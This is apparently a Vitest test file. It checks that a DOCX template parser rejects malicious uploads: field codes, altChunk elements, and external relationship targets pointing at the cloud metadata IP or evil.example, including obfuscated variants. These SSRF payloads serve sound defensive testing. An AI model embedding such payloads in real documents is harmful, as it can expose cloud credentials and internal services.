import { describe, expect, it } from "vitest";
import { extractFields } from "@/lib/docx-template";
import { buildDocx, paragraph } from "./docx-template.test-helpers";

describe("upload-time zip safety checks", () => {
  it("rejects a document containing an INCLUDEPICTURE field code", () => {
    const buf = buildDocx(
      `<w:p><w:r><w:instrText>INCLUDEPICTURE "http://169.254.169.254/latest/meta-data/" \\d</w:instrText></w:r></w:p>`
    );
    expect(() => extractFields(buf)).toThrow();
  });

  it("rejects a document containing an INCLUDETEXT field code", () => {
    const buf = buildDocx(
      `<w:p><w:r><w:instrText>INCLUDETEXT "http://evil.example/x" \\* MERGEFORMAT</w:instrText></w:r></w:p>`
    );
    expect(() => extractFields(buf)).toThrow();
  });

  it("rejects a document containing an altChunk element", () => {
    const buf = buildDocx(`<w:altChunk r:id="rId99"/>${paragraph("{{name}}")}`);
    expect(() => extractFields(buf)).toThrow();
  });

  it("allows an ordinary document with plain paragraphs", () => {
    const buf = buildDocx(paragraph("Hello {{first_name}}"));
    expect(() => extractFields(buf)).not.toThrow();
  });
});

describe("external relationship targets", () => {
  const REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

  it("rejects a linked image pointing at an external URL", () => {
    // `<a:blip r:link>` renders the image by fetching this target, so it is an
    // SSRF vector even though it isn't an attachedTemplate.
    const buf = buildDocx(
      paragraph("{{name}}"),
      `<Relationship Id="rId9" Type="${REL}/image" Target="http://169.254.169.254/latest/meta-data/" TargetMode="External"/>`
    );
    expect(() => extractFields(buf)).toThrow();
  });

  it("rejects an external attached template declared with single-quoted attributes", () => {
    const buf = buildDocx(
      paragraph("{{name}}"),
      `<Relationship Id='rId9' Type='${REL}/attachedTemplate' Target='http://evil.example/x.dotx' TargetMode='External'/>`
    );
    expect(() => extractFields(buf)).toThrow();
  });

  it("rejects an external target on a non-self-closing Relationship element", () => {
    const buf = buildDocx(
      paragraph("{{name}}"),
      `<Relationship Id="rId9" Type="${REL}/oleObject" Target="http://evil.example/x" TargetMode="External"></Relationship>`
    );
    expect(() => extractFields(buf)).toThrow();
  });

  it("rejects an external target hidden behind a '>' in an attribute value", () => {
    // `>` is legal inside an XML attribute value, so a scanner that reads a tag
    // as `[^>]*` stops early and never sees the TargetMode that follows.
    const buf = buildDocx(
      paragraph("{{name}}"),
      `<Relationship Id="rId9" Type="${REL}/image" Target="http://169.254.169.254/?a=>" TargetMode="External"/>`
    );
    expect(() => extractFields(buf)).toThrow();
  });

  it("rejects an external target whose mode is obfuscated with a character reference", () => {
    // A real XML parser decodes this to "External"; a literal string match
    // against "External" would not.
    const buf = buildDocx(
      paragraph("{{name}}"),
      `<Relationship Id="rId9" Type="${REL}/image" Target="http://evil.example/x" TargetMode="&#69;xternal"/>`
    );
    expect(() => extractFields(buf)).toThrow();
  });

  it("allows a relationship that declares an explicitly internal target", () => {
    const buf = buildDocx(
      paragraph("{{name}}"),
      `<Relationship Id="rId9" Type="${REL}/image" Target="media/image1.png" TargetMode="Internal"/>`
    );
    expect(() => extractFields(buf)).not.toThrow();
  });

  it("allows an external hyperlink, which is only resolved when a reader clicks it", () => {
    const buf = buildDocx(
      paragraph("{{name}}"),
      `<Relationship Id="rId9" Type="${REL}/hyperlink" Target="https://example.com/" TargetMode="External"/>`
    );
    expect(() => extractFields(buf)).not.toThrow();
  });
});
